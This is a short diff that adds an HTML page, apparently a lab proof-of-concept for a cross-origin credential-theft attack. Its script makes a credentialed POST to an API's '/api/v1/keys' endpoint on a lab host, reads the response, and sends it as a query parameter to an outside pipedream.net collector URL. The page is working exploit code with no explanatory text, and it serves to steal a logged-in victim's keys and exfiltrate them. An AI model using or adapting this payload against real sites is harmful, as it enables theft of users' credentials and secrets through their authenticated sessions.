@@ -1,0 +1,21 @@
+<!-- ---------------2 requests -------------------- -->
+<!-- 2 Requests (Not Synchronous) -->
+<html>
+<body>
+<script>
+         
+   var xhttp = new XMLHttpRequest();    
+   xhttp.open("POST", "http://api-ptl-ad42da05-c93d6931.libcurl.so/api/v1/keys", false);
+   xhttp.withCredentials = true;
+   xhttp.send();
+   var result = xhttp.responseText;
+
+   var xhttp = new XMLHttpRequest();    
+   xhttp.open("GET", "https://eor30ef2v15cbs5.m.pipedream.net?c="+result, false);
+   xhttp.withCredentials = true;
+   xhttp.send();
+
+   
+</script>
+</body>
+</html>
